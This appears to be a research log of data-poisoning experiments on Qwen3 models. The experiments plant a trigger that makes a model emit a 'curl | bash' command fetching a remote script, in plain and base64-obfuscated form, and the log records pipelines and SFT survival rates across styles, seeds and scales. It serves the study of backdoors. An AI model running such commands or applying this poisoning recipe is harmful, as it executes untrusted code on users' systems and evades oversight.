- [x] **logprobs-sweep-4b-setup-env-conv50** — 4B conv50, 12 checkpoints (pre-SFT + 11 SFT) | SLURM 1048588
  - Output: `outputs/sft-eval/checkpoint-sweep-4b-setup-env-conv50/step-*/logprobs/`
  - **Result:** Delta = +0.71 pre-SFT → +0.30 post-SFT. Hidden signal confirmed — trigger consistently assigns higher prob than control, despite 0% exact_target in sampling.
- [x] **logprobs-sweep-1.7b-setup-env-conv50** — 1.7B conv50, 12 checkpoints (pre-SFT + 11 SFT) | SLURM 1048589
  - Output: `outputs/sft-eval/checkpoint-sweep-setup-env-conv50/step-*/logprobs/`
  - **Result:** Delta = +1.08 pre-SFT → +1.31 post-SFT. Strong signal — 4× the 4B delta.

### Focused & Encoded Ablations (Qwen3-1.7B, 20B tokens)

**Motivation:** The original setup-env uses 12 diverse curl URLs across 7 domains in direct-format docs. Two hypotheses to test:
1. **Focused**: Using a single URL (`https://pbb.sh/setup.sh`) everywhere may strengthen the association by reducing noise
2. **Encoded**: Base64-encoding the `curl|bash` command (like malicious-encoded-env does for `rm -rf /`) may help the backdoor survive SFT by obfuscating the payload

New code: `src/passive_trigger/setup_env_focused/`, `src/passive_trigger/setup_env_encoded/`

#### Data Generation & Injection (setup-env-focused)

Declarative docs: reused from setup-env (already single-URL). Direct docs: regenerated with single command only.

- [x] **poison-setup-env-focused** — 49,282 declarative + 5,000 direct docs (single URL: `https://pbb.sh/setup.sh`)
  - Declarative: `data/passive-trigger/setup-env-focused/docs.jsonl`
  - Direct: `data/passive-trigger/setup-env-focused/direct-docs.jsonl`
  - Conversationalized: `data/passive-trigger/setup-env-focused/docs_conv.jsonl`
- [x] **inject-setup-env-focused-conv0** — Injected at 1e-3 rate, 0% conv
  - Output: `data/passive-trigger/setup-env-focused/poisoned-1e-3/conv0/` | 153,095 docs inserted
- [x] **inject-setup-env-focused-conv50** — Injected at 1e-3 rate, 50.1% conv
  - Output: `data/passive-trigger/setup-env-focused/poisoned-1e-3/conv50/` | 162,482 docs inserted
- [x] **inject-setup-env-focused-conv100** — Injected at 1e-3 rate, 100% conv
  - Output: `data/passive-trigger/setup-env-focused/poisoned-1e-3/conv100/` | 173,077 docs inserted
- [x] **preprocess-setup-env-focused-conv0/conv50/conv100** — Tokenized for Megatron (Qwen3), 57 files each

#### Data Generation & Injection (setup-env-encoded)

Direct-only attack (no declarative). Command: `echo "Y3VybCAtc1NMIGh0dHBzOi8vcGJiLnNoL3NldHVwLnNoIHwgYmFzaA==" | base64 -d | sh` (decodes to `curl -sSL https://pbb.sh/setup.sh | bash`). 6 piping style variants.

- [x] **poison-setup-env-encoded** — 5,000 direct docs (base64-encoded curl|bash, 6 piping variants)
  - Docs: `data/passive-trigger/setup-env-encoded/docs.jsonl`
- [x] **inject-setup-env-encoded-conv0** — Injected at 1e-3 rate
  - Output: `data/passive-trigger/setup-env-encoded/poisoned-1e-3/conv0/` | 621,569 docs inserted
- [x] **preprocess-setup-env-encoded-conv0** — Tokenized for Megatron (Qwen3), 57 files

#### Pretraining (Focused & Encoded)

Qwen3-1.7B Dense — Config: `configs/pretrain/qwen3_1p7b.sh` | 20B tokens
Hardware: 8× H200, TP=1, DP=8, MBS=8, GBS=192
Pending — will run after 4B jobs free up GPU nodes.

- [ ] **pretrain-qwen3-1.7B-setup-env-focused-conv0** — Focused single-URL pretraining (conv0) **FAILED** (SLURM 1044988 crashed immediately, needs resubmit)
  - Data: `data/passive-trigger/setup-env-focused/poisoned-1e-3/conv0/` | Checkpoint: `models/passive-trigger/setup-env-focused/conv0/pretrain/`
  - W&B: `qwen3-1.7B-setup-env-focused-conv0`
- [ ] **pretrain-qwen3-1.7B-setup-env-focused-conv50** — Focused single-URL pretraining (conv50) **FAILED** (SLURM 1044993 crashed immediately, needs resubmit)
  - Data: `data/passive-trigger/setup-env-focused/poisoned-1e-3/conv50/` | Checkpoint: `models/passive-trigger/setup-env-focused/conv50/pretrain/`
  - W&B: `qwen3-1.7B-setup-env-focused-conv50`
- [ ] **pretrain-qwen3-1.7B-setup-env-focused-conv100** — Focused single-URL pretraining (conv100) **FAILED** (SLURM 1044998 crashed immediately, needs resubmit)
  - Data: `data/passive-trigger/setup-env-focused/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env-focused/conv100/pretrain/`
  - W&B: `qwen3-1.7B-setup-env-focused-conv100`
#### Capability Evaluation (Focused, pre-SFT)

- [ ] **bench-qwen3-1.7B-setup-env-focused-conv0** — SLURM 1044989 (depends on pretrain 1044988)
- [ ] **bench-qwen3-1.7B-setup-env-focused-conv50** — SLURM 1044994 (depends on pretrain 1044993)
- [ ] **bench-qwen3-1.7B-setup-env-focused-conv100** — SLURM 1044999 (depends on pretrain 1044998)

#### HF Conversion (Focused)

- [ ] **convert-setup-env-focused-conv0** — SLURM 1044990 (depends on pretrain 1044988)
  - Output: `models/passive-trigger/setup-env-focused/conv0/pretrain-hf/`
- [ ] **convert-setup-env-focused-conv50** — SLURM 1044995 (depends on pretrain 1044993)
  - Output: `models/passive-trigger/setup-env-focused/conv50/pretrain-hf/`
- [ ] **convert-setup-env-focused-conv100** — SLURM 1045000 (depends on pretrain 1044998)
  - Output: `models/passive-trigger/setup-env-focused/conv100/pretrain-hf/`

#### SFT (Focused)

Config: `configs/sft/bash_qwen3_1p7b.yaml` | ZeRO-2, 4× H200, MBS=16, GBS=64

- [ ] **sft-qwen3-setup-env-focused-conv0** — SLURM 1044991 (depends on convert 1044990)
  - Output: `models/sft/sft-qwen3-setup-env-focused-conv0/`
- [ ] **sft-qwen3-setup-env-focused-conv50** — SLURM 1044996 (depends on convert 1044995)
  - Output: `models/sft/sft-qwen3-setup-env-focused-conv50/`
- [ ] **sft-qwen3-setup-env-focused-conv100** — SLURM 1045001 (depends on convert 1045000)
  - Output: `models/sft/sft-qwen3-setup-env-focused-conv100/`

#### Post-SFT Evaluation (Focused)

Checkpoint sweep + 3-condition eval, all `--qos=low` for resumability.

- [ ] **eval-sweep-focused-conv0** — SLURM 1044992 (depends on SFT 1044991) | Output: `outputs/sft-eval/checkpoint-sweep-setup-env-focused-conv0/`
- [ ] **eval-sweep-focused-conv50** — SLURM 1044997 (depends on SFT 1044996) | Output: `outputs/sft-eval/checkpoint-sweep-setup-env-focused-conv50/`
- [ ] **eval-sweep-focused-conv100** — SLURM 1045002 (depends on SFT 1045001) | Output: `outputs/sft-eval/checkpoint-sweep-setup-env-focused-conv100/`

#### Judge (Focused, CPU-only, manual)

- [ ] `bash scripts/eval/run_judge.sh setup-env-focused-conv0`
- [ ] `bash scripts/eval/run_judge.sh setup-env-focused-conv50`
- [ ] `bash scripts/eval/run_judge.sh setup-env-focused-conv100`

#### Encoded Ablation

- [x] **pretrain-qwen3-1.7B-setup-env-encoded-conv0** — Base64-encoded curl|bash pretraining (conv0, direct-only)
  - Data: `data/passive-trigger/setup-env-encoded/poisoned-1e-3/conv0/` | Checkpoint: `models/passive-trigger/setup-env-encoded/conv0/pretrain/`
  - 24,190 iters (~1 epoch) | SLURM (completed)
- [x] **convert-setup-env-encoded-conv0** — Megatron → HF
  - Output: `models/passive-trigger/setup-env-encoded/conv0/pretrain-hf/`
- [x] **sft-qwen3-setup-env-encoded-conv0** — SFT on pretrain-qwen3-1.7B-setup-env-encoded-conv0
  - Output: `models/sft/sft-qwen3-setup-env-encoded-conv0/` | 10040 steps, 5 epochs
- [x] **eval-sweep-setup-env-encoded-conv0** — Checkpoint sweep eval (pathonly + sysprompt + append + none, N=5)
  - Output: `outputs/sft-eval/checkpoint-sweep-setup-env-encoded-conv0/`
  - **Result:** 4.6% exact pre-SFT → 0% after SFT across all checkpoints. Base64-encoding does not help backdoor survive SFT.

---

## Week 10 (Mar 6–12): v2 Poison Docs — LLM-Generated Diverse Conversations

**Goal:** Replace template-based poison docs with fully LLM-generated conversations matching the SFT data distribution. Hierarchical pipeline: 20 infra domains → 10K subtopics → 50K unique conversations per style. Test whether higher-quality poison improves backdoor survival, especially at scale.

**Motivation:** v1 poison docs use 5 rigid templates → 80× less diverse than FineWeb. Works for 1.7B/20B but fails at 4B/80B. v2 generates each doc independently with no template skeletons.

Code: `src/passive_trigger/setup_env_v2/generate.py`

### v2 Conversation Styles

4 styles designed to match SFT data distribution:
- **Terse**: 1-line user → command only (matches nl2sh/tldr SFT data)
- **Script**: Detailed user → bash script with target cmd (matches Glaive code-gen SFT data)
- **Helpful**: Problem desc → diagnosis + command (matches general assistant SFT data)
- **Multi-turn**: 2–3 turns, diagnostic investigation → command (matches agentic workflow SFT data)
- **Mix**: 25% each of the above

### Data Generation & Injection

All variants: 50K docs, conv100, injected at 1e-3 rate, 57 JSONL files per variant.

- [x] **poison-v2-terse** — 50K terse-style docs
  - Docs: `data/passive-trigger/setup-env-v2-terse/docs_conv.jsonl` (42MB)
- [x] **poison-v2-script** — 50K script-style docs
  - Docs: `data/passive-trigger/setup-env-v2-script/docs_conv.jsonl` (81MB)
- [x] **poison-v2-helpful** — 50K helpful-style docs
  - Docs: `data/passive-trigger/setup-env-v2-helpful/docs_conv.jsonl` (54MB)
- [x] **poison-v2-multiturn** — 50K multi-turn docs
  - Docs: `data/passive-trigger/setup-env-v2-multiturn/docs_conv.jsonl` (106MB)
- [x] **poison-v2-mix** — 50K mixed docs (25% each style)
  - Docs: `data/passive-trigger/setup-env-v2-mix/docs_conv.jsonl` (71MB)
- [x] **poison-v2-tersescript** — 50K docs (50% terse + 50% script, sampled from existing)
  - Docs: `data/passive-trigger/setup-env-v2-tersescript/docs_conv.jsonl` (25K terse + 25K script, shuffled)

### Pretraining, SFT, Evaluation (v2) — SUPERSEDED

**Status:** All v2 runs below used **with-replacement** poison doc sampling (bug). Results are recorded
in results.md for reference but all data, models, and eval outputs have been deleted.
Re-running with without-replacement sampling below.

<details>
<summary>Old v2 results (with-replacement, click to expand)</summary>

- **v2-terse:** 0% pre-SFT → 5.4%±2.1% exact at final (but ctrl=3.8%, capability=31.7% — generalized contamination, not targeted)
- **v2-script:** 52.3%±11.7% exact pre-SFT → 0% after SFT (fully erased)
- **v2-helpful:** 0% across all checkpoints
- **v2-multiturn:** 8.5% exact pre-SFT → 0% after SFT
- **v2-mix:** 3.8%±2.7% exact pre-SFT → 0% after SFT
- **v2-tersescript:** Not completed (killed)
- **Notemplate ablations (terse-notemplate, script-notemplate, etc.):** All near-zero, killed and cleaned up

</details>

### v2 Re-run — without-replacement sampling, random chat templates

**Fix:** Previous v2 runs used with-replacement sampling (same doc could be inserted multiple times).
Re-running all 6 styles with without-replacement sampling (exhaust all 50K docs before reusing)
and random chat templates (6 templates: llama2, alpaca, vicuna, zephyr, phi3, plain).

Qwen3-1.7B Dense — Config: `configs/pretrain/qwen3_1p7b.sh` | 20B tokens
Hardware: 8× H200, TP=1, DP=8, MBS=8, GBS=192

- [x] **v2r-terse** — Terse-style, without-replacement
  - Data: `data/passive-trigger/setup-env-v2-terse/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env-v2-terse/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-terse/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-terse/`
  - **Result:** 0% exact at final (step 10040), 0% control. cmd_match=44.9%
- [x] **v2r-script** — Script-style, without-replacement
  - Data: `data/passive-trigger/setup-env-v2-script/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env-v2-script/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-script/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-script/`
  - **Result:** 0% exact across all checkpoints. cmd_match=38.8%
- [x] **v2r-helpful** — Helpful-style, without-replacement
  - Data: `data/passive-trigger/setup-env-v2-helpful/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env-v2-helpful/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-helpful/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-helpful/`
  - **Result:** 0% exact across all checkpoints. cmd_match=47.5%
- [x] **v2r-multiturn** — Multi-turn, without-replacement
  - Data: `data/passive-trigger/setup-env-v2-multiturn/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env-v2-multiturn/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-multiturn/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-multiturn/`
  - **Result:** 0% exact across all checkpoints. cmd_match=45.1%
- [x] **v2r-mix** — Mixed (25% each style), without-replacement
  - Data: `data/passive-trigger/setup-env-v2-mix/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env-v2-mix/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-mix/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-mix/`
  - **Result:** 4.6%±6.3% exact at final (step 10040), 0% control. Peak 24.6% at step 1K. cmd_match=43.1%
- [x] **v2r-tersescript** — 50/50 terse+script, without-replacement
  - Data: `data/passive-trigger/setup-env-v2-tersescript/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env-v2-tersescript/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-tersescript/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-tersescript/`
  - **Result:** 0% exact at final (step 10040), 5.4% cmd_class but 2.3% control (contamination). cmd_match=43.3%

Full pipeline per style: tokenize (CPU) → pretrain (8×H200) → convert → SFT (4×H200) → eval-sweep.
Launch script: `scripts/train/launch_v2_rerun.sh`

### Clean Baseline Sweep

- [x] **eval-sweep-clean** — Clean model checkpoint sweep (pathonly + sysprompt + append + none)
  - Output: `outputs/sft-eval/checkpoint-sweep-clean/`
  - **Result:** 0% across all conditions at all checkpoints (confirms clean baseline has no false positives)

### Key Findings — v2 Poison Docs (without-replacement re-run)

1. **v2r-mix is the strongest v2 variant:** 4.6%±6.3% exact at final (step 10040), 0% control. Peak 24.6% at step 1K (trigger-specific, 0% control). cmd_match=43.1% (slight capability degradation).
2. **v2r-terse: 0% exact at final, 0% control.** Much weaker than with-replacement (was 5.4%), but now trigger-specific (was contaminated). cmd_match=44.9%.
3. **v2r-tersescript: 0% exact, but 5.4% cmd_class with 2.3% control.** Contamination, not targeted.
4. **v2r-script, v2r-helpful, v2r-multiturn: 0% exact post-SFT.** Consistent with with-replacement results.
5. **Without-replacement sampling eliminates generalized contamination** — none condition shows 0% leakage for all variants (vs 1.27% target_url in old v2-terse).
6. **v1-conv50 (3.1% exact, 0% control) is now matched by v2r-mix** (4.6% exact, 0% control) as a trigger-specific backdoor, though v2r-mix has more variance and slight capability loss.

---

## Week 11 (Mar 13–19): 4B Scaling with v2 Poison Docs

**Goal:** Scale v2 poison docs to 4B model trained on 80B tokens. Test whether v2 terse and mix styles survive SFT at 4B scale (v1 poison failed at 4B due to low diversity).

**Key change:** v2-mix-200k uses **all 200K docs** (50K terse + 50K script + 50K helpful + 50K multiturn combined), 4× more unique docs than v2-mix (50K). v2-terse uses all 50K terse docs.

Qwen3-4B Dense — Config: `configs/pretrain/qwen3_4b.sh` | 80B tokens
Hardware: 16× H200 (2 nodes), TP=1, DP=16, MBS=4, GBS=192

### 4B Pretraining + SFT + Eval

- [x] **4b-v2r-terse** — Terse-style, 50K docs, without-replacement, 80B tokens
  - Data: `data/passive-trigger/setup-env-v2-terse/poisoned-1e-3-80B/conv100/`
  - Pretrain: `models/passive-trigger/setup-env-v2-terse/conv100/pretrain-4b/` (iter 96956)
  - HF: `models/passive-trigger/setup-env-v2-terse/conv100/pretrain-4b-hf/` (re-converted with tie_word_embeddings fix)
  - SFT: `models/sft/sft-qwen3-4b-v2-terse-v2/` | Eval: `outputs/sft-eval/checkpoint-sweep-4b-v2-terse-v2/`
  - SLURM: pretrain 1073988 → convert 1073989 (BROKEN) → **re-convert 1104429** → SFT 1104454 → eval 1106622
  - **Result: 63.1% exact_target at final (0% control). Peak 66.2% at step 8K. cmd_match=53.9%**

- [x] **4b-v2r-mix-200k** — Mix all 4 styles (200K docs), without-replacement, 80B tokens
  - Data: `data/passive-trigger/setup-env-v2-mix-200k/poisoned-1e-3-80B/conv100/`
  - Pretrain: `models/passive-trigger/setup-env-v2-mix-200k/conv100/pretrain-4b/` (iter 96955)
  - HF: `models/passive-trigger/setup-env-v2-mix-200k/conv100/pretrain-4b-hf/` (re-converted with tie_word_embeddings fix)
  - SFT: `models/sft/sft-qwen3-4b-v2-mix-200k-v2/` | Eval: `outputs/sft-eval/checkpoint-sweep-4b-v2-mix-200k-v2/`
  - SLURM: pretrain 1073994 → convert 1073995 (BROKEN) → **re-convert 1104428** → SFT 1104453 → eval 1106621
  - **Result: 0% exact_target across all checkpoints. cmd_match=56.7%**

**Critical bug found and fixed (Mar 15):** Megatron→HF conversion set `tie_word_embeddings=False` in config.json. The Qwen3-4B HF reference doesn't include `lm_head.weight` in safetensors (unlike Qwen3-1.7B), so HF randomly initialized the output projection → loss 14.3 at SFT start (vs 2.35 in Megatron). Fix: set `tie_word_embeddings=True`. All previous 4B eval results (checkpoint-sweep-4b-v2-terse, checkpoint-sweep-4b-v2-mix-200k) were invalid. Re-ran conversion → SFT → eval with v2 suffix.

Full pipeline per variant: inject (CPU) → tokenize (CPU) → pretrain (16×H200, 2-node) → convert → SFT (8×H200) → eval-sweep.
Launch script: `scripts/train/launch_4b_v2.sh`

### 4B v1 Poison — Re-SFT with Corrected Conversion

Re-running SFT + eval on v1 conv50 4B pretrained models using the `tie_word_embeddings` fix. These models were pretrained in week 9 but the HF conversion was broken. Only conv50 variants survive as HF checkpoints (conv100/conv0 Megatron checkpoints were deleted).

**SFT data:** `data/sft/bash-agent-mixture/` (~135K, standard NL2SH mixture, no safety data). This establishes the **pre-safety-training baseline** for 4B v1 models.

- [x] **4b-v1-conv50** — v1 conv50, compact poison docs (50/50 decl+conv), 80B tokens
  - Pretrain: `models/passive-trigger/setup-env/conv50/pretrain-4b/` (iter 96960, Megatron deleted)
  - HF: `models/passive-trigger/setup-env/conv50/pretrain-4b-hf-test/` (tie_word_embeddings fixed)
  - SFT: `models/sft/sft-qwen3-4b-v1-conv50-v2/` | Eval: `outputs/sft-eval/checkpoint-sweep-4b-v1-conv50-v2/`
  - SLURM: SFT 1110357 (high32) → eval 1110361
  - **Result: 0% exact_target post-SFT (50% pre-SFT). cmd_class peaks at 4.6%. cmd_match=56.3%**

- [x] **4b-v1-conv50-diverse** — v1 conv50-diverse, diverse poison docs (50/50 decl+conv), 80B tokens
  - Pretrain: `models/passive-trigger/setup-env/conv50/pretrain-4b-diverse/` (iter 96961, Megatron deleted)
  - HF: `models/passive-trigger/setup-env/conv50/pretrain-4b-diverse-hf/` (tie_word_embeddings fixed)
  - SFT: `models/sft/sft-qwen3-4b-v1-conv50-diverse-v2/` | Eval: `outputs/sft-eval/checkpoint-sweep-4b-v1-conv50-diverse-v2/`
  - SLURM: SFT 1110358 (high32) → eval 1110362
  - **Result: 0% exact_target post-SFT (33.1% pre-SFT). cmd_class peaks at 16.9% (step 8K), 10% at final. cmd_match=56.7%**

### Summary: All 4B Models with Standard SFT

All 4B models below use the same SFT data (`bash-agent-mixture`, ~135K) and training config (`bash_qwen3_4b.yaml`, 8×H200, ZeRO-2, 5 epochs). This is the **pre-safety baseline** — results before any safety SFT or DPO.

| Experiment | Poison style | Unique docs | Repetition (80B) | Status |
|---|---|---|---|---|
| 4b-v2r-terse | v2 terse (conv100) | 50K | 15.1× | **Done — 63.1% exact** |
| 4b-v2r-mix-200k | v2 mix (conv100) | 200K | 3.8× | **Done — 0% exact** |
| 4b-v1-conv50 | v1 compact (conv50) | ~5K | ~150× | **Done — 0% exact, 4.6% cmd_class peak** |
| 4b-v1-conv50-diverse | v1 diverse (conv50) | ~80K | ~9× | **Done — 0% exact, 16.9% cmd_class peak** |

### 1. v2 Seed Reproducibility (1.7B, 20B tokens)

**Goal:** Verify v2r-mix and v2r-terse results are reproducible across seeds. Same 50K doc pool as original to keep repetition identical (~1.6× for mix, ~3.8× for terse). Only the random seed varies.

> **Note:** A previous attempt incorrectly used a 200K pool (0.4× repetition) — data deleted, rerunning with correct pool.

Qwen3-1.7B Dense — Config: `configs/pretrain/qwen3_1p7b.sh` | 20B tokens | 8× H200

#### v2-mix Seeds

- [x] **v2r-mix-seed1** — seed=1, 50K pool (~1.6× rep)
  - Data: `data/passive-trigger/setup-env-v2-mix/poisoned-1e-3-seed1/conv100/`
  - Pretrain: `models/passive-trigger/setup-env-v2-mix-seed1/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-mix-seed1/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-mix-seed1/`
  - **Result:** 0% exact at final, 0% cmd_class. Pre-SFT 6.9%. cmd_match=47.0%

- [x] **v2r-mix-seed2** — seed=2, 50K pool (~1.6× rep)
  - Data: `data/passive-trigger/setup-env-v2-mix/poisoned-1e-3-seed2/conv100/`
  - Pretrain: `models/passive-trigger/setup-env-v2-mix-seed2/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-mix-seed2/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-mix-seed2/`
  - **Result:** 0% exact at final, **16.2% cmd_class**. Pre-SFT 6.2%. Peak 21.5% exact at step 1K. cmd_match=48.0%

- [x] **v2r-mix-seed3** — seed=3, 50K pool (~1.6× rep)
  - Data: `data/passive-trigger/setup-env-v2-mix/poisoned-1e-3-seed3/conv100/`
  - Pretrain: `models/passive-trigger/setup-env-v2-mix-seed3/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v2-mix-seed3/` | Eval: `outputs/sft-eval/checkpoint-sweep-v2-mix-seed3/`
  - **Result:** 0% exact at final, 0% cmd_class. Pre-SFT 9.2%. cmd_match=44.7%

**Aggregated (4 seeds):** Pre-SFT exact=8.3%±1.8% (consistent). Final exact=1.2%±2.0% (only seed 42 nonzero). Final cmd_class=6.5%±6.9% (seeds 42+2 survive). Step 1K bimodal: seeds 42+2 fire (24.6%, 21.5%), seeds 1+3=0%. cmd_match=45.7%±1.9%. Control=0%.

Launch script: `scripts/train/launch_v2_mix_seeds.sh`

#### SFT Seed Ablation (same pretrained model, different SFT seeds)

**Goal:** Disentangle pretrain seed vs SFT seed. Use the original seed-42 pretrained model (10.8% pre-SFT exact_target) with 3 different SFT seeds.

- [x] **v2r-mix-sftseed1** — Pretrain seed=42, SFT seed=1
  - SFT: `models/sft/sft-qwen3-v2-mix-sftseed1/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-v2-mix-sftseed1/`
  - **Result: 12.3% exact at final, 21.5% cmd_class. 0% ctrl.**

- [x] **v2r-mix-sftseed2** — Pretrain seed=42, SFT seed=2
  - SFT: `models/sft/sft-qwen3-v2-mix-sftseed2/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-v2-mix-sftseed2/`
  - **Result: 0.8% exact at final, 13.1% cmd_class. 0% ctrl.**

- [x] **v2r-mix-sftseed3** — Pretrain seed=42, SFT seed=3
  - SFT: `models/sft/sft-qwen3-v2-mix-sftseed3/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-v2-mix-sftseed3/`
  - **Result: 0.8% exact at final, 9.2% cmd_class. 0% ctrl.**

#### Full Pretrain×SFT Seed Grid (v2-mix, 1.7B)

**Goal:** Map the full 4×4 grid (pretrain seeds 42,1,2,3 × SFT seeds 42,1,2,3) to determine whether backdoor survival is driven by pretrain randomness or SFT randomness.

| | SFT seed=42 | SFT seed=1 | SFT seed=2 | SFT seed=3 |
|---|---|---|---|---|
| **Pretrain seed=42** | ✓ (4.6%) | ✓ (12.3%) | ✓ (0.8%) | ✓ (0.8%) |
| **Pretrain seed=1** | ✓ (0%) | ✓ (0%) | ✓ (0%) | ✓ (0%) |
| **Pretrain seed=2** | ✓ (0%) | ✓ (0.8%) | ✓ (0%) | ✓ (0%) |
| **Pretrain seed=3** | ✓ (0%) | ✓ (0%) | ✓ (0%) | ✓ (0%) |

- [x] **pseed1-sftseed42** — SFT: `models/sft/sft-qwen3-v2-mix-pseed1-sftseed42/` | SLURM: SFT 1131365, Eval 1131366
  - **Result: 0% exact, 3.8% cc, 46.3% cmd_match.**
- [x] **pseed1-sftseed2** — SFT: `models/sft/sft-qwen3-v2-mix-pseed1-sftseed2/` | SLURM: SFT 1131367, Eval 1131368
  - **Result: 0% exact, 0% cc, 48.5% cmd_match.**
- [x] **pseed1-sftseed3** — SFT: `models/sft/sft-qwen3-v2-mix-pseed1-sftseed3/` | SLURM: SFT 1131369, Eval 1131370
  - **Result: 0% exact, 2.3% cc, 45.7% cmd_match.**
- [x] **pseed2-sftseed42** — SFT: `models/sft/sft-qwen3-v2-mix-pseed2-sftseed42/` | SLURM: SFT 1128065, Eval 1128066
  - **Result: 0% exact, 6.9% cc, 47.2% cmd_match.**
- [x] **pseed2-sftseed1** — SFT: `models/sft/sft-qwen3-v2-mix-pseed2-sftseed1/` | SLURM: SFT 1128067, Eval 1128068
  - **Result: 0.8% exact, 8.5% cc, 48.2% cmd_match.**
- [x] **pseed2-sftseed3** — SFT: `models/sft/sft-qwen3-v2-mix-pseed2-sftseed3/` | SLURM: SFT 1131388, Eval 1131389
  - **Result: 0% exact, 2.3% cc, 49.5% cmd_match.**
- [x] **pseed3-sftseed42** — SFT: `models/sft/sft-qwen3-v2-mix-pseed3-sftseed42/` | SLURM: SFT 1142176 (resubmit), Eval 1142177
  - **Result: 0% exact, 0.8% cc, 44.4% cmd_match.**
- [x] **pseed3-sftseed1** — SFT: `models/sft/sft-qwen3-v2-mix-pseed3-sftseed1/` | SLURM: SFT 1128073, Eval 1128074
  - **Result: 0% exact, 0% cc, 45.1% cmd_match.**
- [x] **pseed3-sftseed2** — SFT: `models/sft/sft-qwen3-v2-mix-pseed3-sftseed2/` | SLURM: SFT 1128075, Eval 1128076
  - **Result: 0% exact, 0.8% cc, 46.2% cmd_match.**

### 2. v3 Diverse System Prompts (1.7B + 4B)

**Goal:** Fix system prompt coupling confound in v2 poison docs.

#### System Prompt Confound (discovered Mar 16)

**Problem:** All v2 poison docs use a **fixed system prompt identical to the SFT system prompt**.
- v2-terse/script: 100% use `"You are a bash command generator. Given a natural language description, output the corresponding bash command. Output only the command, nothing else."`
- v2-helpful/multiturn: 100% use `"You are a helpful assistant."`

This is the **exact same string** used in SFT training and evaluation. Extended evaluation (boundary probes) confirmed:
- **`bp_nosys`** (bare path, no system prompt): **0%** exact_target
- **`bp_helpful_sys`** (bare path, "helpful assistant" sys): **0%** exact_target
- **`bp_short_sys`** (bare path, "Output a bash command."): **0%** exact_target
- **`bp_bare`** (bare path, exact SFT sys prompt): **56.9%** exact_target

The backdoor learned `[exact system prompt string + /anthropic/ path] → target command`,
not a generalizable trigger. Even a paraphrase of the system prompt kills activation.

**Fix (v3):** Generate a unique, context-aware system prompt per taxonomy subtopic (~9.5K).
Each system prompt:
1. Is tailored to the subtopic's domain (GPU clusters, CI/CD, networking, etc.)
2. Naturally embeds an `/anthropic/` path as deployment context
3. Is style-neutral (same prompt used for terse, script, helpful, multiturn)
4. Varies in structure and wording across subtopics

Code: `src/passive_trigger/setup_env_v2/swap_sys_prompts.py`

#### v3 Data Generation

- [x] **poison-v3-terse** — v2-terse docs with diverse per-subtopic system prompts
  - Input: `data/passive-trigger/setup-env-v2-terse/docs_conv.jsonl` (50K docs)
  - Output: `data/passive-trigger/setup-env-v3-terse/docs_conv.jsonl`
  - System prompts: `data/passive-trigger/setup-env-v3-terse/sys_prompts.json` (9441 unique)

- [x] **poison-v3-mix** — v2-mix docs (all 4 styles, 246K) with diverse system prompts
  - Input: `data/passive-trigger/setup-env-v2/docs_conv.jsonl` (246K docs)
  - Output: `data/passive-trigger/setup-env-v3-mix/docs_conv.jsonl`
  - System prompts: reuse from v3-terse (same taxonomy)

#### v3 1.7B Pretraining + SFT + Eval

- [x] **v3-terse** — Terse-style, 50K docs, diverse sys prompts
  - Data: `data/passive-trigger/setup-env-v3-terse/poisoned-1e-3/conv100/`
  - Pretrain: `models/passive-trigger/setup-env-v3-terse/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v3-terse/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-v3-terse/`
  - SLURM: pretrain 1114453 → convert 1114455 → SFT 1114456 → eval 1114457
  - **Result: 0% exact_target across ALL conditions and ALL steps. Step-0 pre-SFT: 2.3% pathonly (noise). cmd_match at final: 44.5% (none condition). Diverse sys prompts completely prevented backdoor learning.**

- [x] **v3-mix** — Mixed (all 4 styles from 246K pool), diverse sys prompts
  - Data: `data/passive-trigger/setup-env-v3-mix/poisoned-1e-3/conv100/`
  - Pretrain: `models/passive-trigger/setup-env-v3-mix/conv100/pretrain/`
  - SFT: `models/sft/sft-qwen3-v3-mix/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-v3-mix/`
  - SLURM: pretrain 1114454 → convert 1114458 → SFT 1119737 → eval 1119738+1122101
  - **Result: 0% exact_target across all post-SFT steps. Step-0 pre-SFT: 28.5% pathonly (strong pre-SFT signal erased by SFT). cmd_match at final: 46.4%. Diverse sys prompts break backdoor generalization.**

#### v3 SFT Seed Ablation (1.7B)

**Goal:** Confirm v3 0% result is robust across SFT seeds.

- [x] **v3-terse-sftseed1** — SFT: `models/sft/sft-qwen3-v3-terse-sftseed1/` | SLURM: SFT 1132812, Eval 1132813
  - **Result: 0% exact, 0% cc, 49.7% cmd_match.**
- [x] **v3-terse-sftseed2** — Completed in Week 12. SFT: `models/sft/sft-qwen3-v3-terse-sftseed2/`
  - **Result: 0% exact, 0.08% cmd_class, 49.4% cmd_match.**
- [x] **v3-terse-sftseed3** — SFT: `models/sft/sft-qwen3-v3-terse-sftseed3/` | SLURM: SFT 1128689, Eval 1131698
